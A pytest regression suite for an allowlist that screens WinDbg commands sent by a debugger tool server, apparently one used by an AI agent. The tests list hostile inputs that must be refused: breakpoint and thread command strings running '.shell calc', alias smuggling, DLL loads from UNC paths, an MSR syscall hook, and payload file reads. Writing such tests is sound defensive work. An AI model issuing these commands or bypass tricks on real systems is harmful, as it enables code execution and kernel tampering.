"""
Regression tests for the WinDbg gate after it was inverted to an ALLOWLIST.

The first remediation pass narrowed a DENYLIST. The adversarial review then
verified, by executing the validator, that the following still reached the
debugger. Each numbered group below is one of those findings; the numbering
matches the review.

  1. Command-string carriers -- commands whose ARGUMENT is itself a command,
     executed later and never re-validated (breakpoint command lists, ``~*e``,
     ``sxe -c``, ``.pcmd``, ``.ocommand``, ``!list -x``, ``!for_each_*``, the
     trailing Command of the step family, ``g`` with break commands).
  2. Double-quoted bodies were wholly unvalidated; pass 1 added single-quote
     recursion only, and WinDbg's breakpoint command lists are double-quoted.
  3. An unbalanced ``${`` made the tokenizer copy the whole remainder into one
     part behind a harmless leading token.
  4. The tokenizer invented a backslash escape for ``;`` that WinDbg does not
     implement, desynchronising its split from the debugger's.
  5. Twins of denied commands (.readmem, .logappend, .server, q/qq/qd, ...).
  6. Write/exec primitives (wrmsr, ob/ow/od, !eb/!ed, !ecb/!ecd/!ecw, f/fp, m,
     .fiximports, .closehandle, .allow_exec_cmds, ``g =Address``, .thread,
     .trap, .apply_dbp, ``.cxr /w``).
  7. Register writes in every spelling the old regex missed, including the
     alias-defining ``r$.u0=`` form.
  8. A bang token naming a DLL path -- dbgeng LoadLibrary's it INTO THE
     DEBUGGER PROCESS, no ``.load`` required.

Plus the three rules the review found inert or wrong, and the opt-in gate on
the raw command tool.
"""

from __future__ import annotations

import sys
from unittest.mock import MagicMock

import pytest

sys.modules.setdefault("mcp", MagicMock())
sys.modules.setdefault("mcp.server", MagicMock())
sys.modules.setdefault("mcp.server.fastmcp", MagicMock())

from src.engines.dynamic.windbg.allowlist import (  # noqa: E402
    parse_compound,
    validate_command,
)


def assert_refused(command: str) -> str:
    ok, reason = validate_command(command)
    assert ok is False, f"{command!r} reached the debugger"
    assert reason
    return reason


def assert_allowed(command: str) -> None:
    ok, reason = validate_command(command)
    assert ok is True, f"{command!r} should be permitted; refused with: {reason}"


# ---------------------------------------------------------------------------
# (1) Command-string carriers
# ---------------------------------------------------------------------------


class TestBreakpointCommandLists:
    """``bp``/``bu``/``bm``/``ba``/``bs``/``bsc`` run their command on every hit."""

    @pytest.mark.parametrize("verb", ["bp", "bu", "bm", "ba", "bs", "bsc"])
    @pytest.mark.parametrize("payload", [
        ".shell calc",
        ".dump /ma c:\\out.dmp",
        ".dvalloc 1000",
        "eb ffff800000000000 90",
        "$$><c:\\evil.txt",
        ".load evil.dll",
    ])
    def test_double_quoted_command_list_is_revalidated(self, verb, payload):
        assert_refused(f'{verb} nt!NtCreateFile "{payload}"')

    @pytest.mark.parametrize("verb", ["bp", "bu", "bm", "ba", "bs", "bsc"])
    def test_single_quoted_command_list_is_revalidated(self, verb):
        assert_refused(f"{verb} nt!NtCreateFile '.shell calc'")

    def test_command_list_with_multiple_subcommands_checks_all_of_them(self):
        assert_refused('bp X "k; lm; .shell calc"')

    def test_benign_command_list_still_allowed(self):
        assert_allowed('bp nt!NtCreateFile "k; lm"')


class TestThreadSpecificCommandStrings:
    """``~*e`` / ``~0 e``: the CommandString is the rest of the input line."""

    @pytest.mark.parametrize("cmd", [
        "~*e .shell calc",
        "~0 e .shell calc",
        "~. e .shell calc",
        "~#e .dvalloc 1000",
        "~*e r @rip=401000",
        "~0e .shell calc",
    ])
    def test_thread_command_string_refused(self, cmd):
        assert_refused(cmd)

    @pytest.mark.parametrize("cmd", ["~", "~*", "~5s", "~.", "~*k", "~3kn"])
    def test_bare_thread_specifiers_still_allowed(self, cmd):
        assert_allowed(cmd)


class TestOtherCarriers:
    @pytest.mark.parametrize("cmd", [
        # Exception / module-load event commands.
        'sxe -c ".shell calc" ld',
        'sxd -c2 ".shell calc" av',
        'sxi -c ".shell calc" bpe',
        'sxn -c ".shell calc" ch',
        # Periodic / idle / debuggee-driven command injection.
        '.pcmd -s ".shell calc"',
        ".idle_cmd .shell calc",
        ".ocommand DBGCMD",
        ".browse .shell calc",
        # Extension carriers.
        '!list -x ".shell calc" nt!PsActiveProcessHead',
        "!for_each_module .shell calc",
        "!for_each_process .shell calc",
        "!for_each_thread .shell calc",
        "!for_each_frame .shell calc",
        "!for_each_local .shell calc",
        "!for_each_function .shell calc",
        "!for_each_register .shell calc",
        # Step / trace family with a trailing Command.
        'p ".shell calc"',
        't ".shell calc"',
        'pa 401000 ".shell calc"',
        'pc ".shell calc"',
        'pct ".shell calc"',
        'ph ".shell calc"',
        'pt ".shell calc"',
        'ta 401000 ".shell calc"',
        'tb ".shell calc"',
        'tc ".shell calc"',
        'tct ".shell calc"',
        'th ".shell calc"',
        'tt ".shell calc"',
        'wt ".shell calc"',
        # Go with trailing break commands.
        'g 401000 ".shell calc"',
    ])
    def test_carrier_refused(self, cmd):
        assert_refused(cmd)

    @pytest.mark.parametrize("cmd", ["p", "t", "g", "gc", "gu"])
    def test_bare_execution_control_still_allowed(self, cmd):
        assert_allowed(cmd)


# ---------------------------------------------------------------------------
# (2) Double-quoted bodies
# ---------------------------------------------------------------------------


class TestDoubleQuotedBodies:
    def test_double_quoted_body_of_a_carrier_is_validated(self):
        reason = assert_refused('bp X ".shell calc"')
        assert "quoted subcommand" in reason

    def test_double_quoted_text_of_a_non_carrier_is_data(self):
        # .printf's argument is a format string, not a command; validating it
        # as one would be the over-block that made the old tool layer refuse
        # perfectly good commands.
        assert_allowed('.printf "%p .shell calc\\n", @$teb')

    def test_apostrophe_in_a_double_quoted_string_is_literal(self):
        assert_allowed('.printf "it\'s fine"')


# ---------------------------------------------------------------------------
# (3) Unbalanced ${ fails closed
# ---------------------------------------------------------------------------


class TestUnbalancedInterpolation:
    @pytest.mark.parametrize("cmd", [
        "k ${ ; .shell calc",
        "lm ${unclosed",
        ".foreach (a {!process 0 0}) {!handle ${a} ; .shell calc",
    ])
    def test_unbalanced_interpolation_refused(self, cmd):
        assert_refused(cmd)

    def test_unbalanced_interpolation_does_not_hide_the_tail(self):
        assert ".shell calc" in parse_compound("k ${ ; .shell calc")

    def test_balanced_interpolation_still_allowed(self):
        assert_allowed(".foreach (a {!process 0 0}) {!handle ${a}}")


# ---------------------------------------------------------------------------
# (4) No invented backslash escape
# ---------------------------------------------------------------------------


class TestBackslashIsNotAnEscape:
    def test_backslash_semicolon_still_splits(self):
        reason = assert_refused("dt nt!_EPROCESS\\;.dvalloc 1000")
        assert ".dvalloc" in reason

    def test_backslash_newline_still_splits(self):
        assert_refused("lm\\\n.shell calc")

    def test_paths_with_backslashes_still_work_as_arguments(self):
        assert_allowed("!object \\Driver")
        assert_allowed("!drvobj \\Driver\\ACPI 3")


# ---------------------------------------------------------------------------
# (5) Twins of denied commands
# ---------------------------------------------------------------------------


class TestTwinsOfDeniedCommands:
    @pytest.mark.parametrize("cmd", [
        # host file -> target memory (twin of .writemem)
        ".readmem c:\\payload.bin ffff800000000000 L1000",
        # arbitrary file create/write, pairs with the allowed .echo
        ".logappend c:\\Users\\Public\\evil.ps1",
        ".write_cmd_hist c:\\Users\\Public\\evil.ps1",
        # file movement / packaging
        ".send_file c:\\secret",
        ".copysym c:\\evil.pdb",
        ".dumpcab c:\\out.cab",
        ".kdfiles c:\\map.ini",
        # twin of .remote
        ".server tcp:port=5555",
        # twins of .kill / .detach
        "q",
        "qq",
        "qd",
        # twin of .sympath
        ".settings set Symbols.Sympath=\\\\evil\\share",
        # module / extension loading twins
        ".setdll evil.dll",
        ".extpath c:\\evil",
        ".scriptdebug evil.js",
        ".nvload evil",
        ".dbgdbg",
        # network / filesystem
        ".netuse \\\\evil\\share",
        ".createdir c:\\evil",
        ".exdicmd target:name=x",
    ])
    def test_twin_refused(self, cmd):
        assert_refused(cmd)


# ---------------------------------------------------------------------------
# (6) Write / exec primitives
# ---------------------------------------------------------------------------


class TestWriteAndExecPrimitives:
    @pytest.mark.parametrize("cmd", [
        "wrmsr c0000082 fffff80000401000",   # LSTAR -> syscall hook
        "ob 60 90",
        "ow 60 9090",
        "od 60 90909090",
        "!eb 1000 90",
        "!ed 1000 41414141",
        "!ecb 0 0 0 10 90",
        "!ecd 0 0 0 10 90909090",
        "!ecw 0 0 0 10 9090",
        ".cxr /w c:\\ctx.bin",
        "f 1000 L100 90",
        "fp 1000 L100 90",
        "m 1000 1100 2000",
        ".fiximports",
        ".closehandle 4",
        ".allow_exec_cmds 1",
        "g =401000",
        ".thread ffffe000deadbeef",
        ".trap fffff80000401000",
        ".apply_dbp",
        # still-refused primitives from the first pass, as a floor
        "eb 1000 90",
        "a 401000",
        ".dvalloc 1000",
        ".shell calc",
    ])
    def test_primitive_refused(self, cmd):
        assert_refused(cmd)

    def test_cxr_without_switches_still_allowed(self):
        assert_allowed(".cxr ffffe000deadbeef")


# ---------------------------------------------------------------------------
# (7) Register writes in every spelling
# ---------------------------------------------------------------------------


class TestRegisterWrites:
    @pytest.mark.parametrize("cmd", [
        "r @rip = 401000",
        "r @rip=401000",
        "r rax=401000",
        # No whitespace after 'r' -- the old regex required it.
        "r@rip=401000",
        "rrax=401000",
        # Suffix forms.
        "rF",
        "rM 1",
        "rX",
        "rY",
        "rZ",
        "r?",
        # Alias smuggling: aliases expand BEFORE parsing, so this defeats any
        # check that happens after parsing -- including the as/al/ad denial.
        "r$.u0=.shell calc",
        "r $.u0 = .shell",
    ])
    def test_register_write_refused(self, cmd):
        assert_refused(cmd)

    @pytest.mark.parametrize("cmd", ["r", "r rip", "r @rip", "r rax, rbx"])
    def test_register_read_still_allowed(self, cmd):
        assert_allowed(cmd)


# ---------------------------------------------------------------------------
# (8) Bang tokens that name a module path
# ---------------------------------------------------------------------------


class TestBangModulePath:
    @pytest.mark.parametrize("cmd", [
        "!c:\\tmp\\evil.dll.anyexport",
        "!C:/tmp/evil.dll.anyexport",
        "!\\\\server\\share\\evil.dll.anyexport",
        "!..\\evil.dll.help",
        "!evil.load",              # documented !DLLName.load alias
        "!evil.dll.myexport",
    ])
    def test_module_path_bang_refused(self, cmd):
        reason = assert_refused(cmd)
        assert "module path" in reason or "allowlist" in reason

    @pytest.mark.parametrize("cmd", [
        "!process 0 0",
        "!thread",
        "!analyze -v",
        "!drvobj \\Driver\\ACPI 3",
        "!pool ffffe000deadbeef",
        "!object \\",
    ])
    def test_plain_extension_commands_still_allowed(self, cmd):
        assert_allowed(cmd)


# ---------------------------------------------------------------------------
# The three rules the review found inert or wrong
# ---------------------------------------------------------------------------


class TestPreviouslyInertRules:
    def test_chkimg_fix_switch_is_the_documented_dash_form(self):
        # The old rule matched "/f"; the documented switch is "-f", so it
        # never fired on the real syntax. Both spellings are refused now.
        for cmd in ("!chkimg -d nt -f", "!chkimg -f nt", "!chkimg -d nt /f"):
            reason = assert_refused(cmd)
            assert "chkimg" in reason.lower()

    def test_chkimg_comparison_form_still_allowed(self):
        assert_allowed("!chkimg -d nt")

    def test_bugcheck_takes_no_parameters(self):
        # Current docs give .bugcheck with no parameters; the old rule refused
        # an undocumented "simulator" argform instead.
        assert_allowed(".bugcheck")
        for cmd in (".bugcheck 0x7E", ".bugcheck 0xDEADBEEF 1 2 3"):
            reason = assert_refused(cmd)
            assert "bare form" in reason

    def test_search_has_no_write_form_and_is_refused_by_absence(self):
        # 's' is Search Memory; -b/-w/-d/-q are pattern TYPE specifiers, not a
        # write form. The old "search-and-write" rule was a pure over-block.
        for cmd in ("s -b 1000 L1000 90", "s -d 1000 L100 41414141", "s 1000 L100 90"):
            reason = assert_refused(cmd)
            assert "search-and-write" not in reason


# ---------------------------------------------------------------------------
# Everything this project actually issues must still work
# ---------------------------------------------------------------------------


# Grepped out of src/tools/windbg_tools.py and src/engines/dynamic/windbg/.
# If the allowlist is ever tightened past one of these, a structured tool
# breaks -- which is a failure of the same size as leaving a bypass open.
INTERNALLY_ISSUED = [
    "bl",                                          # windbg_list_breakpoints
    "bc 0xfffff80012340000",                       # delete_breakpoint fallback
    "r",                                           # get_registers fallback
    "u 0xfffff80012340000 L10",                    # windbg_disassemble
    "u fffff80012340000 L1",                       # get_current_location
    "!drvobj \\Driver\\ACPI 3",                    # get_driver_object
    "!devobj 0xffffe000deadbeef",                  # get_device_object
    "!pool 0xffffe000deadbeef",                    # get_pool_metadata
    "!analyze -v",                                 # analyze_crash
    "lm",                                          # get_loaded_drivers
    "lm k",                                        # get_loaded_drivers fallback
    "!process 0 0",                                # get_processes
    "!object \\",                                  # get_object_directory
    "!object \\Driver",
    'bp 0xfffff80012340000 ".if (rcx==0x100) {} .else {gc}"',  # conditional bp
    "kn 0x20",                                     # get_stack
    "~5s",                                         # switch_thread / get_stack
    "!thread",                                     # get_thread
    "!thread 0xfffffa8012345678",
    "!process 0 0x7",                              # get_process
    "!process 0xfffffa80abcd 0x0",
    "dt -r1 nt!_EPROCESS",                         # dump_type
    "dt -r2 nt!_EPROCESS 0x1000",
    "ba e 1 0xfffff80012340000",                   # set_hardware_breakpoint
    ".break",                                      # break_in fallback
]


@pytest.mark.parametrize("cmd", INTERNALLY_ISSUED)
def test_internally_issued_commands_still_pass(cmd):
    assert_allowed(cmd)


PLAIN_READ_COMMANDS = [
    "lm", "lm m nt", "k", "kb", "kn", "kv", "r", "r @rip",
    "dt nt!_EPROCESS", "dt nt!_EPROCESS ffffe000deadbeef",
    "u nt!KeBugCheckEx L10", "uf nt!KeBugCheckEx",
    "!process 0 0", "!thread", "!analyze -v", "!handle 0 f",
    "db 0x1000", "dd 0x1000", "dq nt!PsInitialSystemProcess L1",
    "dps nt!PsInitialSystemProcess L4", "da 0x1000", "du 0x1000",
    "x nt!Ps*", "ln 0xfffff80012340000", "!address 0x1000", "!pte 0x1000",
    ".formats 0x41", ".tlist", ".outmask /l verbose", ".printf \"hello\"",
    ".echo hello", ".reload /f", ".lastevent", ".exr -1", ".frame 3",
    "vertarget", "version", "? 1+1", "?? @$teb",
    "g; k", "k\r\nlm", "k\nr @rip\nlm m nt",
    ".foreach (a {!process 0 0}) {!handle ${a}}",
    ".foreach (a {!process 0 0}) {.foreach (b {!handle ${a}}) {!thread ${b}}}",
]


@pytest.mark.parametrize("cmd", PLAIN_READ_COMMANDS)
def test_plain_read_commands_still_pass(cmd):
    assert_allowed(cmd)


# ---------------------------------------------------------------------------
# The raw command tool is opt-in
# ---------------------------------------------------------------------------


class _CapturingApp:
    """Stands in for FastMCP: records the functions register_windbg_tools decorates."""

    def __init__(self) -> None:
        self.tools: dict[str, object] = {}

    def tool(self, *_args, **_kwargs):
        def decorator(fn):
            self.tools[fn.__name__] = fn
            return fn
        return decorator


@pytest.fixture()
def windbg_tools():
    mod = pytest.importorskip(
        "src.tools.windbg_tools", reason="windbg_tools requires FastMCP"
    )
    app = _CapturingApp()
    mod.register_windbg_tools(app)
    return mod, app.tools


def test_raw_command_tool_is_disabled_by_default(windbg_tools, monkeypatch):
    mod, tools = windbg_tools
    monkeypatch.delenv(mod._RAW_WINDBG_ENV, raising=False)
    result = tools["windbg_execute_command"]("lm")
    assert "disabled by default" in result
    assert mod._RAW_WINDBG_ENV in result
    # The refusal must point somewhere useful, not just say no.
    assert "structured" in result.lower()
    assert "windbg_get_stack" in result


@pytest.mark.parametrize("truthy", ["1", "true", "TRUE", "yes", "on"])
def test_env_var_enables_the_raw_command_tool(windbg_tools, monkeypatch, truthy):
    mod, tools = windbg_tools
    monkeypatch.setenv(mod._RAW_WINDBG_ENV, truthy)
    result = tools["windbg_execute_command"]("lm")
    # Enabled: it gets past the policy gate. On a non-Windows CI host the next
    # gate is the platform check, which is the proof the policy gate opened.
    assert "disabled by default" not in result


@pytest.mark.parametrize("falsy", ["", "0", "no", "off", "false", " "])
def test_non_truthy_env_values_keep_it_disabled(windbg_tools, monkeypatch, falsy):
    mod, tools = windbg_tools
    monkeypatch.setenv(mod._RAW_WINDBG_ENV, falsy)
    assert "disabled by default" in tools["windbg_execute_command"]("lm")


def test_structured_tools_do_not_need_the_env_var(windbg_tools, monkeypatch):
    """The gate is on the raw tool, not on the bridge.

    All 32 structured tools call WinDbgBridge directly. If the opt-in were
    implemented in the bridge (or in execute_command) they would all break
    with the variable unset, which is why this asserts on a tool that reaches
    the platform check rather than a policy refusal.
    """
    mod, tools = windbg_tools
    monkeypatch.delenv(mod._RAW_WINDBG_ENV, raising=False)
    for name in ("windbg_list_breakpoints", "windbg_status", "windbg_get_modules"):
        result = tools[name]()
        assert "disabled by default" not in result
        assert mod._RAW_WINDBG_ENV not in result


def test_raw_tool_gate_is_read_at_call_time(windbg_tools, monkeypatch):
    mod, tools = windbg_tools
    monkeypatch.delenv(mod._RAW_WINDBG_ENV, raising=False)
    assert mod._raw_windbg_enabled() is False
    monkeypatch.setenv(mod._RAW_WINDBG_ENV, "1")
    assert mod._raw_windbg_enabled() is True
    monkeypatch.setenv(mod._RAW_WINDBG_ENV, "0")
    assert mod._raw_windbg_enabled() is False


def test_tool_layer_no_longer_runs_a_second_substring_gate(windbg_tools):
    """Architecture check: one authoritative layer, named in the source.

    The tool used to scan ``_BLOCKED_COMMANDS`` as a substring blocklist, which
    refused ``.printf``/``.foreach``/``.outmask``/``.formats``/``.tlist``/
    ``.bugcheck`` -- commands the validator permits -- while being blind to
    every token only the bridge knew about.
    """
    import ast
    import inspect

    mod, _ = windbg_tools
    tree = ast.parse(inspect.getsource(mod))
    # AST, not a substring scan: the docstring explains the history and names
    # the constant on purpose. What must not come back is a reference to it in
    # executable code.
    referenced = {
        node.id for node in ast.walk(tree) if isinstance(node, ast.Name)
    } | {
        alias.name
        for node in ast.walk(tree)
        if isinstance(node, ast.ImportFrom)
        for alias in node.names
    }
    assert "_BLOCKED_COMMANDS" not in referenced, (
        "the tool layer is scanning the legacy substring blocklist again"
    )
    # And the commands that list over-blocked are accepted by the gate.
    for cmd in (".printf \"x\"", ".foreach (a {!process 0 0}) {!handle ${a}}",
                ".outmask /l verbose", ".formats 0x41", ".tlist", ".bugcheck"):
        assert_allowed(cmd)
